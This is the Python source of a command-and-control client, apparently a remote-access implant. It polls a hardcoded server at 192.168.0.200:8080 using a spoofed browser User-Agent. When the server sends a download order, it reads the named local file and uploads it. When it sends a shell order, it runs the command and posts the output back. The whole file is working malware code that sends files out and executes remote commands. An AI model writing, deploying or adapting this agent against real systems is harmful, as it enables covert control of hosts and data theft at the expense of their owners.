#!/usr/bin/env python3

import asyncio
import aiohttp
import aiofiles
from aiohttp.client import ClientTimeout
from datetime import datetime
import subprocess
import json
import os
import sys

global exitcode 
exitcode = "No"

print("Started C2 Client: ")

async def webclient_init():
    global exitcode 
    if exitcode != "Yes":
        url = 'http://192.168.0.200:8080/client/init'
        headers ={'User-Agent':'Mozilla/5.0 (X33; Ubuntu; Linux x86_64; rv:109.0) Geico/20100101 Firedfox/151.0'}
        timeout = ClientTimeout(total=0)
        async with aiohttp.ClientSession(headers = headers, timeout = timeout) as session:
            async with session.get(url) as response:
                print("Status:", response.status)
                print("Content-type:", response.headers['content-type'])
                html = await response.text()
                await webclient_checkin()
    else:
        sys.exit("The server terminated remote agent session..............")

async def webclient_checkin():
    global exitcode
    while exitcode == "No":
        url = 'http://192.168.0.200:8080/client/checkin'
        headers ={'User-Agent':'Mozilla/5.0 (X33; Ubuntu; Linux x86_64; rv:109.0) Geico/20100101 Firedfox/151.0'}
        timeout = ClientTimeout(total=0)
        async with aiohttp.ClientSession(headers = headers, timeout = timeout) as session:
            async with session.get(url) as response:
                print("Status:", response.status)
                print("Content-type:", response.headers['content-type'])
                json_resp = await response.json()
                print("Body:", json_resp[:15], "...")
                print(" ")
                command = json_resp
                for payload in command:
                    if 'downloadcmd' in payload:
                        cmd_type, file_path = payload.split()
                        url_path = "7"
                        url2 = 'http://192.168.0.200:8080/client/call/%s' % str(url_path)
                        async with aiofiles.open(file_path, 'r', encoding='utf8', errors='ignore') as file: #
                            file_content = await file.read()
                            print("Uploading file to: %s" % url2)
                            headers ={'User-Agent':'Mozilla/5.0 (X33; Ubuntu; Linux x86_64; rv:109.0) Geico/20100101 Firedfox/151.0'}
                            timeout = ClientTimeout(total=0)
                            async with aiohttp.ClientSession(headers = headers, timeout = timeout) as session:
                                async with session.put(url2, data=file_content) as response:
                                    print("Status:", response.status)
                                    print("Content-type:", response.headers['content-type'])
                                    html = await response.text()
                                    print (html)
                                    print("Body:", html[:15], "...")
                    elif "shellcmd" in payload:
                        shell_cmd = payload
                        cmd_type, cmd_string = shell_cmd.split(",")
                        cmd_list = list(cmd_string.split())
                        print("Command List: %s" % cmd_list)
                        print(f"Executing payload: {cmd_list}")
                        results = run_command(cmd_list)
                        url_path = "8"
                        url2 = 'http://192.168.0.200:8080/client/call/%s' % str(url_path)
                        print("Posting results to: %s" % url2)
                        headers ={'User-Agent':'Mozilla/5.0 (X33; Ubuntu; Linux x86_64; rv:109.0) Geico/20100101 Firedfox/151.0'}
                        timeout = ClientTimeout(total=0)
                        async with aiohttp.ClientSession(headers = headers, timeout = timeout) as session:
                            async with session.post(url2, data=results) as response:
                                print("Status:", response.status)
                                print("Content-type:", response.headers['content-type'])
                                html = await response.text()
                                print (html)
                                print("Body:", html[:15], "...")
                    else:
                        pass

def run_command(com):
    try:
        pro = subprocess.run(com, capture_output=True, text=True)
        if pro.stdout:
            return f"---------------output---------------\n {pro.stdout}"
        elif pro.stderr:
            return f"---------------error----------------\n {pro.stderr}"
        else:
            return f"[executed]"
    except Exception as ex:
        print("exception occurred", ex)
        return f"   [subprocess broke]"

if __name__ == '__main__':
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        asyncio.run(webclient_init())
    except KeyboardInterrupt:
        pass